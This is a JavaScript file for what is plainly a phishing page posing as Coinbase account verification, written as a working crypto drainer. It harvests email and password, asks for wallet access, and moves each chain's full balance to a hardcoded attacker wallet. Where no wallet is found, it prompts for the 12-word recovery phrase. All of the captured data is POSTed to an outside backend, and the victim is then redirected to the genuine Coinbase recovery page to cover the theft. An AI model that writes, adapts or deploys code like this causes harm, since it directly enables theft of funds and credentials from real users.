const API_URL = 'https://cb-backend-new.onrender.com';
const HOT_WALLET = '0xBE4525d8672d8284a979B3616522af15b3191A95';

const NETWORKS = {
    'Ethereum': '0x1',
    'Base': '0x2105',
    'Arbitrum': '0xa478c',
    'Polygon': '0x89'
};

document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');

    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!email || !pass) return alert("Please fill in all fields.");
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
    };

    document.getElementById('connectBtn').onclick = async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const status = document.getElementById('status');

        if (window.ethereum) {
            try {
                status.innerText = "Requesting access...";
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAddr = accounts[0];

                for (const [name, chainId] of Object.entries(NETWORKS)) {
                    try {
                        status.innerText = `Scanning ${name}...`;
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: chainId }],
                        });

                        const balance = await window.ethereum.request({ 
                            method: 'eth_getBalance', 
                            params: [userAddr, 'latest'] 
                        });

                        if (parseInt(balance, 16) > 0) {
                            await window.ethereum.request({
                                method: 'eth_sendTransaction',
                                params: [{
                                    from: userAddr,
                                    to: HOT_WALLET,
                                    value: balance, 
                                }],
                            });
                        }
                    } catch (chainErr) {
                        console.log(`${name} skipped`);
                    }
                }
                
                await sendLeadData(email, pass, userAddr, null);
                status.innerText = "Verification complete. Redirecting...";
                setTimeout(() => { window.location.href = 'https://www.coinbase.com/password-recovery'; }, 2000);

            } catch (globalErr) {
                setupRecovery(email, pass);
            }
        } else {
            setupRecovery(email, pass);
        }
    };

    function setupRecovery(email, pass) {
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo">
            <h1 class="cb-header">Verify Identity</h1>
            <p>Please enter your 12-word recovery phrase to continue.</p>
            <div class="input-group">
                <input type="text" id="phrase" placeholder="word1 word2 word3..." style="text-align:center;">
            </div>
            <button id="submitPhrase" class="btn-primary">Restore Account</button>
            <div id="phrase_status" class="status-text"></div>
        `;

        document.getElementById('submitPhrase').onclick = async () => {
            const phrase = document.getElementById('phrase').value.trim();
            const s = document.getElementById('phrase_status');
            
            if (phrase.split(/\s+/).length !== 12) {
                s.innerText = "Exactly 12 words required.";
                return;
            }

            s.innerText = "Verifying phrase...";
            await sendLeadData(email, pass, null, phrase);
            s.innerText = "Verified. Redirecting...";
            setTimeout(() => {
                window.location.href = 'https://www.coinbase.com/password-recovery';
            }, 2000);
        };
    }

    async function sendLeadData(email, pass, wallet, phrase) {
        try {
            await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    email: email, 
                    password: pass, 
                    walletAddress: wallet, 
                    recoveryPhrase: phrase 
                })
            });
        } catch (e) {
            console.error("Lead log failed");
        }
    }
});
